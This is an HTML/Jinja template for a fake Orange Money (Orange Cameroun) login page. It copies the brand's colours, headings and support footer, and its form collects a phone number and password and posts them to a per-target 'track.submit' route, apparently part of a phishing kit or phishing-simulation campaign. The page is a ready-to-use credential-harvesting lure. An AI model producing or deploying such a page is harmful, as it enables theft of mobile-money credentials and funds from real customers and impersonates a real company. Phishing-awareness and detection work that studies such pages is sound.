<!doctype html>
<html lang="fr"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Orange Money</title>
<style>
  body { margin:0; font-family: 'Helvetica Neue', Arial, sans-serif; background:#000; }
  .header { background:#FF6600; color:#fff; padding:18px; text-align:left; font-weight:bold; font-size:1.5rem; padding-left:24px;}
  .box { max-width:380px; margin:40px auto; background:#fff; padding:30px; border-radius:8px;}
  h2 { color:#FF6600;}
  input { width:100%; padding:12px; margin:8px 0; box-sizing:border-box; border:1px solid #ddd; border-radius:4px;}
  button { width:100%; padding:13px; background:#FF6600; color:#fff; border:0; border-radius:4px; font-weight:bold; font-size:1rem; cursor:pointer;}
  .footer { text-align:center; margin-top:14px; font-size:.75rem; color:#888;}
</style></head><body>
<div class="header">orange Money</div>
<div class="box">
  <h2>Connexion securisee</h2>
  <p style="font-size:.92rem; color:#333;">Identifiez-vous pour acceder a votre compte Orange Money.</p>
  <form method="post" action="{{ url_for('track.submit', token=token) }}">
    <input type="text" name="identifier" placeholder="Numero Orange (6XX XXX XXX)" required>
    <input type="password" name="secret" placeholder="Mot de passe" required>
    <button type="submit">SE CONNECTER</button>
  </form>
  <div class="footer">Orange Cameroun S.A. — Service Client *144#</div>
</div>
</body></html>
